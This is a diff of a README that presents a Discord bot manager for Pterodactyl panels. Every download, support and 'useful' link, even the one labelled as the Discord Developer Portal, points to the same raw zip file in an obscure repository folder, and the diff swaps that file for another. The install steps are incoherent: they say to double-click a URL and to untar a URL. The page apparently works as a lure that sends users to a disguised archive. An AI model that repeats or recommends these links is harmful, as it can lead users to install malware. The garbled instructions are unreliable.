@@ -1,6 +1,6 @@
 # 🦖 Pterodactyl-Discord-Manager-PDM - Your Simple Discord Bot Solution
 
-![Download PDM](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip)
+![Download PDM](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip)
 
 ## 📦 Overview
 
@@ -18,21 +18,21 @@ To start using PDM, follow these simple steps. You will need access to Discord a
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Pterodactyl-Discord-Manager-PDM Releases](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip).
+1. Visit this page to download: [Pterodactyl-Discord-Manager-PDM Releases](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip).
    
 2. Once on the Releases page, find the latest version listed. Click on the version number to reveal the available assets.
 
 3. Download the appropriate file for your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip`
-   - For macOS, download `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip`
-   - For Linux, download `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip`
+   - For Windows, download `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip`
+   - For macOS, download `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip`
+   - For Linux, download `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip`
 
 4. Once the download completes, follow these additional steps based on your operating system.
 
 ### 🖥️ Windows Installation
 
 - Locate the downloaded `.exe` file in your Downloads folder.
-- Double-click `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip` to begin the installation.
+- Double-click `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip` to begin the installation.
 - Follow the prompts in the installation wizard.
 - After installation, open the application from your Start Menu.
 - Configure your bot settings as prompted.
@@ -40,17 +40,17 @@ To start using PDM, follow these simple steps. You will need access to Discord a
 ### 🍏 macOS Installation
 
 - Locate the `.dmg` file in your Downloads folder.
-- Double-click `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip` to open it.
+- Double-click `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip` to open it.
 - Drag and drop the PDM app into your Applications folder.
 - Open the Applications folder and double-click on PDM to run.
 - Set up your bot by following the on-screen instructions.
 
 ### 🐧 Linux Installation
 
-- Locate the downloaded `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip` file in your Downloads folder.
+- Locate the downloaded `https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip` file in your Downloads folder.
 - Open a Terminal window.
 - Navigate to the Downloads folder using the command: `cd ~/Downloads`
-- Extract the files with the command: `tar -xzf https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip`
+- Extract the files with the command: `tar -xzf https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip`
 - Change into the new directory with: `cd PDM_Linux`
 - Run the app using: `./PDM`
 
@@ -98,11 +98,11 @@ We welcome contributions to PDM! If you want to help improve the bot or report a
 
 ## 📞 Support
 
-For any questions or support needs, please refer to our [GitHub Issues](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip). You can also find additional resources in the documentation available within the application.
+For any questions or support needs, please refer to our [GitHub Issues](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip). You can also find additional resources in the documentation available within the application.
 
 ## 🔗 Useful Links
 
-- [Pterodactyl Discord Manager GitHub](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip)
-- [Discord Developer Portal](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/sharkish/Pterodactyl-Discord-Manager-PDM.zip)
+- [Pterodactyl Discord Manager GitHub](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip)
+- [Discord Developer Portal](https://raw.githubusercontent.com/Laine06/Pterodactyl-Discord-Manager-PDM/main/select/Manager-Discord-Pterodactyl-PDM-v1.3.zip)
 
 This README will guide you to download and run PDM successfully. Enjoy enhancing your Discord server!
